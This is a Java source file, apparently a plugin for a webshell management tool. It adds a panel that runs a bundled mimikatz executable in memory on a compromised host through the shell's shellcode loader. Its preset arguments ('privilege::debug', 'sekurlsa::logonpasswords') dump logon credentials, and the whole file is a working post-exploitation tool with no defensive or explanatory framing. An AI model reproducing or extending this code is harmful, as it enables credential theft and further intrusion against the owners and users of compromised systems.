package shells.plugins.generic;

import core.Encoding;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import util.UiFunction;
import util.automaticBindClick;
import util.functions;

public abstract class Mimikatz implements Plugin {
   private final JPanel panel = new JPanel(new BorderLayout());
   private final JLabel argsLabel = new JLabel("args");
   private final JTextField argsTextField = new JTextField(" \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" ");
   private final JButton runButton = new JButton("Run");
   private final JSplitPane splitPane = new JSplitPane();
   private final RTextArea resultTextArea = new RTextArea();
   private boolean loadState;
   protected ShellEntity shellEntity;
   protected Payload payload;
   private Encoding encoding;
   private ShellcodeLoader loader;

   public Mimikatz() {
      this.splitPane.setOrientation(0);
      this.splitPane.setDividerSize(0);
      JPanel topPanel = new JPanel();
      topPanel.add(this.argsLabel);
      topPanel.add(this.argsTextField);
      topPanel.add(this.runButton);
      this.splitPane.setTopComponent(topPanel);
      this.splitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
      this.splitPane.addComponentListener(new ComponentAdapter() {
         public void componentResized(ComponentEvent e) {
            Mimikatz.this.splitPane.setDividerLocation(0.15);
         }
      });
      this.panel.add(this.splitPane);
   }

   protected abstract ShellcodeLoader getShellcodeLoader();

   private void runButtonClick(ActionEvent actionEvent) {
      if (this.loader == null) {
         this.loader = this.getShellcodeLoader();
      }

      if (this.loader == null) {
         GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "未找到loader");
      } else {
         byte[] pe = functions.readInputStreamAutoClose(Mimikatz.class.getResourceAsStream("assets/mimikatz-" + (this.payload.isX64() ? "64" : "32") + ".exe"));

         try {
            byte[] result = this.loader.runPe2(this.argsTextField.getText().trim(), pe, 6000);
            this.resultTextArea.setText(this.encoding.Decoding(result));
         } catch (Exception var4) {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), var4.getMessage());
         }

      }
   }

   public void init(ShellEntity shellEntity) {
      this.shellEntity = shellEntity;
      this.payload = this.shellEntity.getPayloadModule();
      this.encoding = Encoding.getEncoding(this.shellEntity);
      automaticBindClick.bindJButtonClick(Mimikatz.class, this, Mimikatz.class, this);
   }

   public JPanel getView() {
      return this.panel;
   }
}
